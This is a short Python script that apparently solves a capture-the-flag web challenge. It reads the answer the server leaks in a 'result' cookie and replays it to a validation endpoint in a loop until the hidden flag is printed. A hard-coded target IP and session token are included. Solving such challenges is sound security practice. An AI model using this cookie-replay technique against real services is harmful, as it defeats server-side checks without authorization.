#!/usr/bin/python3

import sys,requests,re


#CONSTANTS

PLAY_URL= 'http://162.243.187.35:8081/play.php'
VALIDATE_URL= 'http://162.243.187.35:8081/valida.php'
TOKEN= '048dd3ec94979b395ef082e63ec70286'

#REGEX TO GET FLAG
pattern = re.compile(r'Flag: (.*) Acerto')

if __name__ == '__main__':


    #Get the operation and the cookie which contains the result on first request
    req_page= requests.get(PLAY_URL,cookies={'token':TOKEN})

    match = pattern.search(req_page.text)
    flag = match.group(1)

    while flag == '********':

        resultado = req_page.cookies['result']

        req_page = requests.post(VALIDATE_URL,data={'resultado':resultado},cookies={'token':TOKEN,'result':resultado})

        match = pattern.search(req_page.text)
        flag = match.group(1)


    print("Flag: " + flag )
    sys.exit(0)